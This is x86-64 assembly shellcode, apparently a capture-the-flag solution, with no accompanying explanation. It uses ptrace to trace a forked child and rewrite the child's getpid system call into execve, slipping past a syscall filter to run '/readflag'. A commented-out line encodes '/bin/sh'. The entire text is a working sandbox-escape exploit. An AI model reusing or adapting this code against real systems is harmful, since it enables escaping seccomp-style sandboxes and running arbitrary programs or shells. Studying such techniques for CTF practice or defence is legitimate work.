_start:
  mov rbp, rsp
  mov rax, 57
  syscall                       ; fork()
  test eax, eax
  jz child
  mov [rbp + 0x8], rax          ; cpid

parent:
  lea r10, [rbp + 0x20]
  xor rdx, rdx
  lea rsi, [rbp + 0x10]
  mov rdi, [rbp + 0x8]
  mov rax, 61
  syscall                       ; wait4(cpid, &s, 0)
  mov r10, 1
  xor rdx, rdx
  mov rsi, [rbp + 0x8]
  mov rdi, 0x4200
  mov rax, 101
  syscall                       ; ptrace(PTRACE_SETOPTIONS, cpid, 0, PTRACE_O_TRACESYSGOOD)
  
  .@Lp:
  xor r10, r10
  xor rdx, rdx
  mov rsi, [rbp + 0x8]
  mov rdi, 24
  mov rax, 101
  syscall                       ; ptrace(PTRACE_SYSCALL, cpid, 0, 0)
  lea r10, [rbp + 0x20]
  xor rdx, rdx
  lea rsi, [rbp + 0x10]
  mov rdi, [rbp + 0x8]
  mov rax, 61
  syscall                       ; wait4(cpid, &s, 0)

  mov rax, [rbp + 0x10]
  mov rbx, rax
  and rbx, 0b1111111
  cmp rbx, 0b1111111
  jnz .@Skip
  shr rax, 8
  and rax, 0x80
  test eax, eax
  jz .@Skip

  lea r10, [rbp + 0x40]
  xor rdx, rdx
  mov rsi, [rbp + 0x8]
  mov rdi, 12
  mov rax, 101
  syscall                       ; ptrace(PTRACE_GETREGS, cpid, 0, &r)
  mov rax, [rbp + 0x40 + 0x78]
  cmp rax, 39
  jnz .@Skip

  mov qword [rbp + 0x40 + 0x78], 59   ; dummy --> execve
  lea r10, [rbp + 0x40]
  xor rdx, rdx
  mov rsi, [rbp + 0x8]
  mov rdi, 13
  mov rax, 101
  syscall                       ; ptrace(PTRACE_SETREGS, cpid, 0, &r)
  
  .@Skip:
  mov rax, [rbp + 0x10]
  and rax, 0b1111111
  test rax, rax
  jnz .@Lp
  
  jmp exit

child:
  xor r10, r10
  xor rdx, rdx
  xor rsi, rsi
  xor rdi, rdi
  mov rax, 101
  syscall                       ; ptrace(PTRACE_TRACEME, 0, 0, 0)
  mov rax, 39
  syscall
  mov rsi, 17
  mov rdi, rax
  mov rax, 62
  syscall                       ; kill(getpid(), SIGSTOP)

  ;  mov rax, 0x0068732f6e69622f
  mov rax, 0x616c66646165722f
  mov rbx, 0x0000000000000067
  mov [rbp + 0x10], rax
  mov [rbp + 0x18], rbx
  lea rdi, [rbp + 0x10]
  xor rdx, rdx
  mov [rbp + 0x20], rdi
  mov qword [rbp + 0x28], 0
  lea rsi, [rbp + 0x20]
  mov rax, 39
  syscall                       ; dummy("/readflag", NULL, NULL)

  jmp exit

exit:
  mov rdi, 0
  mov rax, 60
  syscall
